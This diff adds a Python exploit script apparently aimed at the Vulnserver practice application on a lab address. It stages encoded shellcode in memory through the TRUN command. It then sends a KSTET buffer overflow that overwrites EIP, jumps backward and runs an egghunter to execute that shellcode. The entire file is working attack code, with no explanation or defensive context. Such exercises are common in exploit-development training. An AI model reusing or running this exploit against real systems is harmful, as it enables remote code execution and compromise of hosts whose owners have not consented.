@@ -1,0 +1,69 @@
+import socket
+import struct
+
+
+# Function to send shellcode using one of the other commands to have it stored in memory. 
+def inject_memory(TCP_IP, TCP_PORT):
+	
+	shellcode =  b""
+	shellcode += b"\xbf\x0c\x75\x43\x51\xda\xc2\xd9\x74\x24\xf4\x5b"
+	shellcode += b"\x31\xc9\xb1\x31\x31\x7b\x13\x83\xc3\x04\x03\x7b"
+	shellcode += b"\x03\x97\xb6\xad\xf3\xd5\x39\x4e\x03\xba\xb0\xab"
+	shellcode += b"\x32\xfa\xa7\xb8\x64\xca\xac\xed\x88\xa1\xe1\x05"
+	shellcode += b"\x1b\xc7\x2d\x29\xac\x62\x08\x04\x2d\xde\x68\x07"
+	shellcode += b"\xad\x1d\xbd\xe7\x8c\xed\xb0\xe6\xc9\x10\x38\xba"
+	shellcode += b"\x82\x5f\xef\x2b\xa7\x2a\x2c\xc7\xfb\xbb\x34\x34"
+	shellcode += b"\x4b\xbd\x15\xeb\xc0\xe4\xb5\x0d\x05\x9d\xff\x15"
+	shellcode += b"\x4a\x98\xb6\xae\xb8\x56\x49\x67\xf1\x97\xe6\x46"
+	shellcode += b"\x3e\x6a\xf6\x8f\xf8\x95\x8d\xf9\xfb\x28\x96\x3d"
+	shellcode += b"\x86\xf6\x13\xa6\x20\x7c\x83\x02\xd1\x51\x52\xc0"
+	shellcode += b"\xdd\x1e\x10\x8e\xc1\xa1\xf5\xa4\xfd\x2a\xf8\x6a"
+	shellcode += b"\x74\x68\xdf\xae\xdd\x2a\x7e\xf6\xbb\x9d\x7f\xe8"
+	shellcode += b"\x64\x41\xda\x62\x88\x96\x57\x29\xc6\x69\xe5\x57"
+	shellcode += b"\xa4\x6a\xf5\x57\x98\x02\xc4\xdc\x77\x54\xd9\x36"
+	shellcode += b"\x3c\xaa\x93\x1b\x14\x23\x7a\xce\x25\x2e\x7d\x24"
+	shellcode += b"\x69\x57\xfe\xcd\x11\xac\x1e\xa4\x14\xe8\x98\x54"
+	shellcode += b"\x64\x61\x4d\x5b\xdb\x82\x44\x38\xba\x10\x04\x91"
+	shellcode += b"\x59\x91\xaf\xed"
+
+	
+	commands = ['TRUN'] # GTER caused issues
+	
+	
+	
+	for command in commands:
+		
+		payload = "{} b00bb00b{}".format(command, shellcode)
+		
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((TCP_IP, TCP_PORT))
+
+		s.send(payload)
+		s.close()	
+		
+# Main function to redirect execution flow and execute egghunter
+def main_payload(TCP_IP, TCP_PORT):
+
+	egghunter =  b""
+	egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
+	egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x30\x30\x62"
+	egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+	payload = "KSTET /.:/"
+	payload += "A" * 2 # Junk
+	payload += egghunter
+	payload += "A" * (76 - len(payload))
+	payload += struct.pack("<I",0x625011AF) # Overwrite EIP
+	payload += "\xeb\xb8" # Negative jump backwards 60 bytes
+	payload += "D" * (5990 - len(payload)) # Junk
+		
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((TCP_IP, TCP_PORT))
+
+	s.send(payload)
+	s.close()	
+
+TCP_IP = '192.168.56.102'
+TCP_PORT = 9999
+inject_memory(TCP_IP, TCP_PORT)
+main_payload(TCP_IP, TCP_PORT)
